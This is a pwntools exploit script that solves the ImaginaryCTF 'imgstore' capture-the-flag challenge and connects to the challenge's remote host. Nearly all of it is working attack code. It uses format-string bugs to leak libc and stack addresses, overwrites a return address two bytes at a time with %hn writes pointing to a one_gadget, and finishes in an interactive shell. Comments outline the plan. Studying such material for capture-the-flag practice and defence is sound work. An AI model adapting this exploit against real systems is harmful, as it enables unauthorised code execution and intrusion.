from pwn import *
import sys

#Cre: vilex1337

_path = "./imgstore"
exe = ELF(_path)
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
add = 'imgstore.chal.imaginaryctf.org'
port = 1337
cmd = '''
    continue
'''

_option = {'run' : process(_path), 
           'exp' : remote(add, port)}

def conn():
    if(len(sys.argv) == 1):
        return gdb.debug(_path, cmd)
    return _option[sys.argv[1]]

def p(_data):
    return p64(_data, endian = 'little')

chall = conn()

def _sell(payload, _op):
    if(_op == 0):
       chall.sendlineafter(b'>>', b'3')
    chall.sendlineafter(b':', payload)

def _leak(_beg, _end):
    chall.recvuntil(_beg)
    return int(chall.recvuntil(_end)[:-1], 16)   

def _write(_addr, _data):
    _format = b'%' + str(_data).encode() + b'c'
    _format += b'%10$hn'
    _format += b'0' * (16 - len(_format))
    _format += p(_addr)
    _sell(_format, 1)

def check():
    chall.interactive()
    exit()

_arg = []

context.log_level = 'debug'

def main():
    #There are 2 format string bug in 2 functions:
    #- Sell will allow us to use format string manytime we want.
    #- Exit and leave infomations back would allow us format string 1 time then leave ret.
    #My idea is use format string in Sell to setup rop chain so that exit leave ret would jmp into one_gadget and get the shell.

    #Leaking libc and stack so that one gadget could work correctly.
    _format = b'|%25$p||%15$p|'
    _sell(_format, 0)
    libc.address = _leak(b'|', b'|') - 0x24083
    _stack = _leak(b'|', b'|') - 0x18
    _one_gadget = libc.address + 0xe3b01
    print(hex(_stack))
    print(hex(libc.address + 0x24083))
    print(hex(_one_gadget))
    chall.sendlineafter(b']:', b'y')

    #Setup ropchain through format string %n.
    for i in range(4):
        _arg.append((_one_gadget >> (i * 16)) & 0xFFFF)
    for i in range(3):
        _write(_stack + i * 2, _arg[i])
        chall.sendlineafter(b']:', b'y')
    
    #The last 2 bytes have to be zeroed out.
    _format = b'%9$hn' + b'0' * 3 + p(_stack + 6)
    _sell(_format, 1)
    chall.sendlineafter(b']:', b'n')
    chall.interactive()


if __name__ == "__main__":
    main()
